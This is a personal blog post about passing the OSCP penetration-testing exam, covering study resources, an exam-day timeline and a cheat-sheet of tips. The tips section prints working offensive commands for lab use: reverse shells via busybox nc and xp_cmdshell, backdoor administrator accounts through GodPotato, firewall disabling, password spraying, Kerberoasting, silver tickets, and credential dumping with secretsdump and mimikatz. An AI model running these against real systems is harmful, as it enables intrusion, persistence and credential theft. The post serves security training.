---
tags:
  - OSCP
  - offsec
image: https://i.ytimg.com/vi/qqGb25h-5Y8/maxresdefault.jpg
featured: true
title: How I Passed the OSCP
date: 2024-09-18T18:38:38.550Z
lastmod: 2024-09-22T08:05:23.649Z
---
I am a student pursuing a Bachelor's degree in Computer Science and Engineering and I passed the OSCP just six months into my cybersecurity journey, despite having limited prior experience.

Before this, I had mainly worked with MERN Stack Web Development and experimented with Arch Linux and was fully immersed in all things Linux.

Now, let’s spill the beans! How did I score 90 on my first attempt? There must be a secret, right?

![How I Passed the OSCP.gif](/postimgs/Images/How%20I%20Passed%20the%20OSCP.gif)

Keep in mind, even though the exam format for OSCP+ has changed, the core modules and topics remain the same. The tips I share here apply for both OSCP and OSCP+.

Check out my gitbook at https://aditya-3.gitbook.io/oscp

# Steps I Took Before Buying the Course

These were the preparation steps I took before even buying the course and I did these from March to May (3 months).

## TCM Security

I first completed the [Practical Ethical Hacking](https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course) course by TCM and it took me around 10 days to complete, it gave me a solid understanding of what I needed to learn and the breadth of topics I had to cover.

The course introduced me to the **enumeration** methodology I would need to develop and provided a detailed overview of Active Directory. It included setting up a lab with one Domain Controller running Windows Server and two workstations running standard Windows.

Setting up the lab was a unique experience that gave me insights into the inner workings of Active Directory. After the lab was operational, the course covered network attack techniques, and I was introduced to [Hack The Box](https://www.hackthebox.com/hacker), where I learned to hack other AD networks.

This is where I learned various AD attack techniques such as Pass-the-Hash, Pass-the-Ticket, Kerberoasting, AS-REP Roasting, and Silver Ticket Attacks.

Towards the end of the course, Windows and Linux Privilege Escalation was covered, although not comprehensively. The Web Attacks section was also moderately thorough.

## Hack The Box

After TCM Security's course I started with the HTB machine on [TJNull's list](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview?pli=1#) . The machines that helped me the most for AD were **Absolute**, **Cerberus** , **Forest** , **Return**.\
These were harder than the OSCP but it was good material.

I would recommend the better list now which is the [LainKusanagi's list](https://docs.google.com/spreadsheets/u/0/d/18weuz_Eeynr6sXFQ87Cd5F0slOj9Z6rt/htmlview?pli=1), which removed a few out-of-scope machines from TJNull's list and added more practice machines to align closer with the OSCP exam.

## CPTS Path

I started this right after TCM's course and it took me around 1.5 months to complete. I was parallelly practicing on hack the box.

This was the most **comprehensive** material I ever covered for the OSCP and most of my notes for the OSCP are from doing the CPTS Path from HTB Academy. Make an account at HTB Academy and head [here](https://academy.hackthebox.com/paths/jobrole). Now choose the penetration tester Job Role path.

I used the student subscription which allowed access to the whole path, and the best part was I got to keep the material as I completed 100% of it. Skip the SQLMap and Metasploit sections if OSCP is your only goal.

## Vulnlab

This was the most valuable practice I did for AD and Linux and Windows Privilege Escalation. I learnt a lot of new enumeration techniques and one of them directly helped me on the exam.

I would recommend to do this list of [recommendations](https://wiki.vulnlab.com/intro/recommendations) from vulnlab wiki.

# Buying the course

Ok I'll admit, shelling out \$2,599 for the Learn One subscription was a bit terrifying and the stakes were never higher.

![money.gif](/postimgs/Images/money.gif)\
I opted the one year subscription and started it from May 24th.

I will not be going into much detail about the course but I will share how much I am allowed to.

## Course Material

The course material was underwhelming and was nowhere close to the thoroughness of the CPTS Path. I did learn new techniques like different Client Side attacks. I was done with the course material along with labs in around 20 days

## Challenge Labs

I did all the challenge labs except Skylark which I had completed 50% of. Medtech, Relia and Skylark were large networks.

OSCP A,B and C were exam-like and had 3 machines for AD network and 3 standalones. I found them much easier than the actual exam.

I think that's the extent of what I'm allowed to reveal and will stop here.

# Exam Experience

![studying-windy.gif](/postimgs/Images/studying-windy.gif)

I booked my exam for September 15, 2024, nearly 4 months after purchasing the course. Although I never felt fully prepared, I bit the bullet and went for it. The exam turned out to be much tougher than I expected.

This is the timeline of my exam:

**September 15th**

* **11:30 AM:** I completed the initial procedure with the proctor, verified my government ID, and then connected to the exam VPN.
* **11:45 AM:** I started scanning the MS01 machine on the AD network and began working on it.
* **1:00 PM:** The MS01 machine was relatively easy to crack, and I pwned it. This is when things started going downhill. I struggled to find a foothold for MS02, and that’s when I realized I was stuck. I started panicking, so I took a 30-minute break to calm myself down.
* **2:30 PM:** I abandoned the previous path I was on (this turned out to be the best move since it was a rabbit hole anyway). I began thoroughly enumerating the machine.
* **3:45 PM:** The MS02 machine was finally pwned, and I started looking for the path to the Domain Controller.
* **5:00 PM:** I finally got the credentials for Domain Admin and could relax a bit. This took a while because I was being slow and methodical, avoiding another rabbit hole.
* **5:20 PM:** I submitted all the proofs for the AD network, double-checked my notes to ensure I had all the screenshots, and then started on the standalone machine.
* **5:40 PM:** I gained a foothold on one of the standalone machines, which was easy for me since I chose a Linux system—my strong suit.
* **6:20 PM:** I achieved root access on the standalone. Then I took a break for dinner before starting on the next machine.
* **7:00 PM:** I started working on the next standalone machine and had a harder time gaining a foothold as it was more complicated.
* **8:00 PM:** I gained a foothold on standalone #2.
* **9:00 PM:** I successfully pwned the second standalone machine and began working on the report.

**September 16th**

* **4:00 AM:** I stayed up all night finishing the report and ensuring all the proofs were submitted and screenshots were properly taken.

**September 19th**

* **8:30 PM:** I finally received the email that I passed, and a wave of relief washed over me. Time to celebrate!

# Tips & Tricks

![coin.gif](/postimgs/Images/coin.gif)

Whenever you are hacking a machine don't be afraid to lookup hints, it's always better to learn what you don't know than stumbling around in the dark but only look it up when you have already tried everything you know.

The main tip I would like to give is anything you find even slightly suspicious search about it on [HackTricks](https://book.hacktricks.xyz/). It is a great resource and helped me immensely to pass the exam.

## Custom Scripts

One thing that often gets overlooked is the power of scripts. Writing a Bash or Python script for repetitive tasks might seem like a hassle, but it pays off quickly. Automating frequent actions not only saves time but also saves you from frustration, helping you work more efficiently.

Below are a few scripts I’ve made to streamline my workflow. They're not perfect, but they’ve saved me a lot of time. Feel free to take inspiration and adapt them to suit your needs.

Check out my [github repo](https://github.com/AdityaHebballe/Pentest-Scripts) for installation instructions for all of them. Any suggestions are welcome.

### Proxify.sh

This is a script I created after frequently digging through my notes to find tunneling commands.

This script simplifies tunneling by displaying the necessary commands and automatically starting a Python server. It also provides the commands for transferring Chisel or Ligolo binaries to the target, based on user selection.

Here's an example of the script in action. I specified **linux** target (`l`) and with **chisel**(`c`)

![How I Passed the OSCP\_1.png](/postimgs/Images/How%20I%20Passed%20the%20OSCP_1.png)

### Transfile.sh

This is a script I made to make file transfer easier, it displays the commands to transfer files to the target upon providing the filename and target OS.

Here in this example I am transferring **winPEAS.exe** to a **windows** target.

![How I Passed the OSCP\_2.png](/postimgs/Images/How%20I%20Passed%20the%20OSCP_2.png)

### Oh-my-posh

This is a customization for my oh-my-posh config that displays the tun0 IP address directly in the terminal, saving me from typing `ifconfig` repeatedly.

![How I Passed the OSCP\_3.png](/postimgs/Images/How%20I%20Passed%20the%20OSCP_3.png)

Useful for msfvenom payloads, etc.

### Aliases

Aliases let you streamline your most frequently used commands, making them quicker to type.

Add these to you `~/.zshrc` (or the config to whatever shell you use ).

* Use exa to make `ls` prettier and with icons for better readability

```bash
alias ls='exa --icons'
```

![How I Passed the OSCP\_5.png](/postimgs/Images/How%20I%20Passed%20the%20OSCP_5.png)\
Colorful!

* Zoxide enhances your terminal navigation by intelligently tracking your directory usage, allowing for faster and more efficient access to frequently visited directories with minimal typing. I recommend watching this [video](https://www.youtube.com/watch?v=aghxkpyRVDY) on how it does that

```bash
 alias cd='z'
```

* pen is easier to type than penelope.py and I use this listener the most.

```bash
pen='/home/kali/Documents/penelope/penelope.py'
```

## Reverse Shells

For reverse shells use [revshells.com](https://www.revshells.com/) for both windows and Linux

For **Linux** reverse shells try using busybox first as I found that to be the most reliable:

```bash
busybox nc <ip> <port> -e sh
```

For listener use [penelope.py](https://github.com/brightio/penelope) as it automatically upgrades your shell upon receiving a connection.

![How I Passed the OSCP\_4.png](/postimgs/Images/How%20I%20Passed%20the%20OSCP_4.png)

For **Windows** try the Powershell Base64 encoded from revshells.com

And note that you can use the same reverse shell (for example reverse.exe you generated using msfvenom) multiple times.\
Once a reverse shell is connected you can start a listener again and connect to the same port once again.

Prepend *rlwrap* before netcat command so that you can navigate the terminal better.

## Windows Privilege Escalation

So listen closely as you will not find this information **anywhere**.

Sometimes you will have **SeImpersonatePrivilege** and when you use your usual potato attacks like *Juicy Potato* or *PrintSpooler* IT WILL FAIL. This is where [Godpotato](https://github.com/BeichenDream/GodPotato/releases/tag/V1.20) comes in which has worked for me always.\
I use msfvenom to create a payload and execute as nt authority

```powershell
GodPotato -cmd "C:\Users\Public\reverse.exe"
```

Now that's not it.

Sometimes the SeImpersonatePrivilege is not the actual intended path so the Godpotato shell will be broken and you will not be able to execute whoami, no output for mimikatz, etc.

Now the trick is to add an Administratror user using Godpotato.

```powershell
GodPotato -cmd "net user /add backdoor Password123"
GodPotato -cmd "net localgroup administrators /add backdoor"
```

Now to get a shell use RunasCs.exe

```powershell
RunasCs.exe backdoor Password123 "C:/Users/Public/reverse.exe" --force-profile --logon-type 8
```

This will give us a proper shell.

We can also open the RDP port and login using RDP. Run this as Administrator:

```powershell
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0 /f

netsh advfirewall set allprofiles state off

reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Now you RDP using backdoor user.

This can also be done using netexec:

```bash
nxc smb <ip> -u backdoor -p Password123 -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
```

One liner to add a user and enable rdp:

```powershell
net user hacker Hacker123456@ /add & net localgroup administrators hacker /add & net localgroup "Remote Desktop Users" hacker /add & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f & netsh firewall add portopening TCP 3389 "Remote Desktop" & netsh firewall set service remoteadmin enable
```

## Linux Privilege Escalation

For Linux privilege escalation I use the usual linpeas with [pspy](https://github.com/DominicBreuker/pspy).

Pspy can check for programs or scripts that are running at regular intervals.

![How I Passed the OSCP.png](/postimgs/Images/How%20I%20Passed%20the%20OSCP.png)\
In this example we could check if we have write access on the script or if the script uses something like tar with `*` which could open up possibilities of the wildcard privesc path.

The other tool I use is [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration). This sometimes catches SUIDs that I might have missed in linpeas and sometimes highlights information better than linpeas.

For linux always check `/opt` and check if you belong in any [interesting groups](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe).

## Active Directory

Use this [mindmap](https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg) for AD, and also use [ntlmtheft](https://github.com/Greenwolf/ntlm_theft) for client side attacks

Always check the password policy if available first:

```bash
nxc smb <ip> --pass-pol
```

When it comes to AD methodology is very important as missing one minor detail can prevent you from pwning the DC. That said here is a general outline of the methodology I follow

### SMB

* Check SMB shares for anonymous access
  ```bash
  smbclient -L \\\\ip\\
  ```
* Check if the smb files are accessible from any webserver running
* Can you can get usernames from the shares
* Can you put a file on the share which will be clicked by a user, if so can  you can catch the hash using responder(use in analyse mode)
  ```bash
  sudo responder -A -I tun0
  ```

### FTP

* Check for interesting files.
* Check if the ftp files are accessible from any webserver running

### Get users

* Ldap
  ```bash
  nxc ldap <ip> -u '' -p '' --query "(objectClass=*)" "*"
  ```
  Repeat if any credentials are discovered.

* Netexec

  ```bash
  nxc smb <ip> -u UserNAme -p 'PASSWORDHERE' --rid-brute
  ```

  ```
  nxc smb <ip> --users
  ```

  Can be useful for enumerating users without credentials

* Kerbrute
  ```bash
  kerbrute userenum --dc dc.domain.com -d domain.com /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
  ```
  This will bruteforce users.

* RPC
  ```bash
  rpcclient -U '' -N <ip>
  enumdomusers
  querydispinfo
  ```
  Only users:
  ```bash
  rpcclient -U "" <ip> -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep "0x" -v | tr -d '[]' > userlist.txt
  ```

### Got usernames

* Bruteforce usernames as password
  ```bash
  nxc smb <ip> -u usernames.txt -p usernames.txt
  ```
  Try with winrm and rdp too and try once again with `--local-auth`\
  I can not stress enough about this, I lost count how many times I got creds from this
* Asreproasting
  ```bash
  nxc ldap <ip> -u user.txt -p '' --asreproast
  ```
  Crack hash with hashcat

### Got creds

* After getting credentials always enumerate smb shares, ldap, ftp, etc again with the newly gained credentials. Look for description of users in ldap as you might discover credentials for a higher privileged user
  ```bash
  nxc ldap <ip> -u 'username' -p 'password' --query "(objectClass=*)" "*"
  ```

* Kerberoasting
  ```bash
  GetUserSPNs.py -dc-ip <ip> domain.com/user -request
  ```
  Crack hash with hashcat.

* Bloodhound.py
  ```bash
  nxc ldap <ip> -u user -p pass --bloodhound -c All -ns <ip>
  ```
  Check outbound transitive object control

* If it is a service account try **silver ticket attack**. I will add an example with MS SQL
  ```bash
  ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
  ```
  Ex:
  ```bash
  ticketer.py -nthash 1443ec19da4dac4ffc953bca1b57b4cf -domain-sid S-1-5-21-4078382237-1492182817-2568127209 -domain sequel.htb -spn TotesLegit/dc.sequel.htb administrator
  ```
  Now use ticket to login to the SQL service:
  ```bash
  KRB5CCNAME=administrator.ccache mssqlclient.py -k Administrator@dc.sequel.htb
  ```
  Enable xp\_cmdshell:
  ```SQL
  EXEC sp_configure 'show advanced options',1;
  RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell',1; 
  RECONFIGURE;-- 
  ```
  Get a shell:
  ```sql
  EXEC xp_cmdshell "C:\Users\Public\nc64.exe -t -e C:\Windows\System32\cmd.exe <ip> <port>";--
  ```
  Also check for Impersonation
  ```SQL
  SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
  ```

### Got Admin

* After getting admin always use secretsdump
  ```bash
  secretsdump.py domain/user:pass@domain.com
  ```
* Run mimikatz:
  ```powershell
  .\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
  ```
* Enumerate files manually. Use `tree /F` on `C:\Users` to display all files in the users directory recursively.

# Conclusion

I think I've covered most of the tricks I learnt throughout my journey but do checkout my Gitbook for my cheat-sheet which will have more information.

Good luck to anyone preparing for the OSCP and remember "Try Harder"

![How I Passed the OSCP\_1.gif](/postimgs/Images/How%20I%20Passed%20the%20OSCP_1.gif)
